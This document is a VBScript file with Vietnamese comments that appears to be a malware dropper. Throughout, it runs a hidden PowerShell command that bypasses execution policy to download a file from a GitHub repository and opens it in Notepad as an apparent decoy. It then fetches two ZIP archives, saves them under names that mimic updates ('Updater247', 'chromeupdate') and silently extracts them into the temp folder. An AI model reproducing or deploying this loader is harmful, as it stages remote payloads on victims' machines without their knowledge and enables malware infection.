Dim http, url1, url2, tempFolder, zip1, zip2
Dim shell, fso, stream, txtPath, scriptName


Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Lấy đường dẫn và tên script hiện tại
scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)

' Đường dẫn thư mục tạm và file txt cùng tên
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
txtPath = tempFolder & scriptName & ".txt"

' Tải file txt từ GitHub
rawUrl = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/content"
cmd1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
  """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')"""
shell.Run cmd1, 0, True

' Mở file txt sau khi tải
shell.Run "notepad.exe """ & txtPath & """", 1, False

' URL của các file ZIP

url1 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv1.zip"
url2 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv2.zip"

' Lấy thư mục Temp thật của hệ thống
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")

' =============================
' Hàm tải file ZIP và đổi tên
Function DownloadFile(url, savePath)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' Binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2
        stream.Close
        DownloadFile = True
    Else
        MsgBox "Lỗi tải file: " & url
        DownloadFile = False
    End If
End Function

' =============================
' Hàm giải nén vào thư mục cùng tên
Sub ExtractZip(zipPath, targetFolder)
     Dim shApp, zipFile, outFolder
    
    ' Tạo đối tượng Shell.Application riêng để giải nén
    Set shApp = CreateObject("Shell.Application")
    
    ' Nếu thư mục đích chưa có thì tạo
    If Not fso.FolderExists(targetFolder) Then
        fso.CreateFolder targetFolder
    End If
    
    Set zipFile = shApp.Namespace(zipPath)
    Set outFolder = shApp.Namespace(targetFolder)
    
    If Not zipFile Is Nothing And Not outFolder Is Nothing Then
        outFolder.CopyHere zipFile.Items, 4 + 16
    Else
    End If
End Sub

' =============================
' Xử lý PyEnv1.zip
zip1 = tempFolder & "Updater247.zip"
If DownloadFile(url1, zip1) Then
    ExtractZip zip1, tempFolder & "Updater247"
End If

' =============================
' Xử lý PyEnv2.zip
zip2 = tempFolder & "chromeupdate.zip"
If DownloadFile(url2, zip2) Then
    ExtractZip zip2, tempFolder & "chromeupdate"
End If
